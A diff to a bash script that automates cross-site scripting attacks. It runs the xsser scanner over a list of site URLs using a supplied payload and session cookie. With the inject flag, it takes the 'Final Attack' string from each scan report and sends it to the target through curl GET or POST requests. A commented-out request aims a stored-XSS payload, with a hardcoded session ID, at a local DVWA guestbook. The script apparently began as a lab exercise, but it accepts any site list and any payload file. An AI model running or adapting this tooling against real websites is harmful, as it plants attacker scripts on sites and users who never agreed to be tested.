@@ -12,7 +12,8 @@ DEFAULT_PAYLOAD="<script>alert(1)</script>"
 PAYLOAD_FILE_CONTENT=$( [[ -f "${PAYLOAD_FILE_PATH}" ]] && cat "${PAYLOAD_FILE_PATH}" || echo "")
 PAYLOAD="${PAYLOAD_FILE_CONTENT:-$DEFAULT_PAYLOAD}"
 
-MODE=""
+INJECT=false
+SCAN=false
 
 read_list() {
     ARRAY=( $( echo "${1}" ) )
@@ -31,7 +32,7 @@ read_site_urls_list(){
 
 print_info() {
     echo ""
-    echo "Payload: "
+    echo "----- PAYLOAD ----- "
     echo "$PAYLOAD"
     echo ""
     # echo "Sites urls:"
@@ -39,22 +40,56 @@ print_info() {
     # echo ""
 }
 
-insert_payload() {
-    curl -X POST \
-        'http://localhost:8060/vulnerabilities/xss_s/index.php' \
-        -b 'PHPSESSID=c8fcccd96a575a05d6eb307c8107d718; security=low' \
-        --data 'txtName=hijacked&mtxMessage=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'
+inject_payload() {
+    # curl -X POST \
+    #     'http://localhost:8060/vulnerabilities/xss_s/index.php' \
+    #     -b 'PHPSESSID=c8fcccd96a575a05d6eb307c8107d718; security=low' \
+    #     --data 'txtName=hijacked&mtxMessage=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'
+    echo "----- INJECTING PAYLOAD -----"
+    REPORT_FILE=${1}
+    MODE=${2}
+    RAW_OUTPUT=$(grep "CONGRATULATIONS" -A 40 "${REPORT_FILE}")
+
+    echo $MODE
+    FINAL_ATTACK=$(echo "$RAW_OUTPUT" | grep 'Final Attack' | awk '{print $4}')
+
+    if [[ $MODE == *"POST"* ]]; then
+        echo "POST"
+        URL=$(echo "$RAW_OUTPUT" | grep "Target" | awk '{print $3}')
+        curl -X POST \
+         "${URL}" \
+        -b "${COOKIE}" \
+        --data "${FINAL_ATTACK}"
+    fi
+
+    if [[ $MODE == *"GET"* ]]; then
+        echo "POST"
+        URL=$(echo "$RAW_OUTPUT" | grep "Target" | awk '{print $3}')
+        curl -X GET \
+         "${FINAL_ATTACK}" \
+        -b "${COOKIE}"
+    fi
 }
 
-find_and_exploit_vulns(){
+
+calculate_hash() {
+    FILE_PATH="${1}"
+    MD5=$(md5sum "${FILE_PATH}" | awk '{print $1}')
+    echo "${MD5}"
+}
+
+scan_vulns(){
     SCAN_MODE="${1:-""}"
     URL="${2:-""}"
     ENDPOINT="${3:-""}"
+    # ADVANCED_OPTIONS=${4:-""}
+    COOKIE="${4:-""}"
+    echo $COOKIE
 
     [ -z "$URL" ] && exit 0
 
-    echo "Finding and exploiting"
-    echo "URL: ${URL}"
+    echo "----- SCANNING -----"
+    echo "Url: ${URL}"
     [[ -n "${ENDPOINT}" ]] && echo "Endpoint: ${ENDPOINT}"
 
     [[ -z "${ENDPOINT}" ]] && SCAN_MODE="DEFAULT"
@@ -83,6 +118,10 @@ find_and_exploit_vulns(){
             ;;
     esac
 
+    SITE=$(echo "$URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
+
+    REPORT_FILE="$RESULTS_PATH/${SITE}.raw"
+
     xsser $ATTACK_MODE_INPUT \
         -s \
         -v \
@@ -91,10 +130,17 @@ find_and_exploit_vulns(){
         --timeout 30 \
         --retries 1 \
         --delay 0 \
-        --save="$RESULTS_PATH/${URL}.raw" \
-        --Fp "${PAYLOAD}"
+        --Fp="${PAYLOAD}" \
+        --cookie="${COOKIE}" \
+        > "${REPORT_FILE}"
 
-    insert_payload "$RESULTS_PATH/${URL}.xml"
+    MD5=$(calculate_hash "${REPORT_FILE}")
+    FINAL_REPORT="${REPORT_FILE%.raw}-${MD5}.raw"
+    mv "${REPORT_FILE}" "${FINAL_REPORT}"
+
+    if [[ "${INJECT}" = "true" ]]; then
+        inject_payload "${FINAL_REPORT}" "${SCAN_MODE}"
+    fi
 }
 
 usage() {
@@ -102,26 +148,37 @@ usage() {
 }
 
 remote_control() {
-    echo "Starting remote control"
     print_info
 
     while read -r TARGET; do
-        PARAMS=$(echo "${TARGET}" | xargs)
-        find_and_exploit_vulns $PARAMS
-        read -r -p "Press any key to resume ..."
-    done < "${SITES_URLS_FILE_PATH}"
+        if  [[ "${TARGET}"  != \#* ]] ; then
+            PARAMS=$(echo "${TARGET}" | xargs)
+
+            if [[ "${SCAN}" = "true" ]]; then
+                scan_vulns $PARAMS
+            fi
+
+            if [[ "${SCAN}" = "false" && "${INJECT}" = "true" ]]; then
+                for REPORT_FILE in ${RESULTS_PATH}; do
+                    [ -e "${REPORT_FILE}" ] || continue
+                    inject_payload "${REPORT_FILE}" "GETPOST"
+                    done
+            fi
+        fi
+        done < "${SITES_URLS_FILE_PATH}"
 }
 
-while getopts "lua" option; do
-        case "${option}" in
-            l)
-                MODE="--all"
+while getopts "sip:" OPTION; do
+
+    case "${OPTION}" in
+            s)
+                SCAN=true
                 ;;
-            u)
-                MODE="-u"
+            i)
+                INJECT=true
                 ;;
-            a)
-                MODE="--auto ${MODE}"
+            p)
+                PAYLOAD=$(cat $OPTARG)
                 ;;
             *)
                 usage
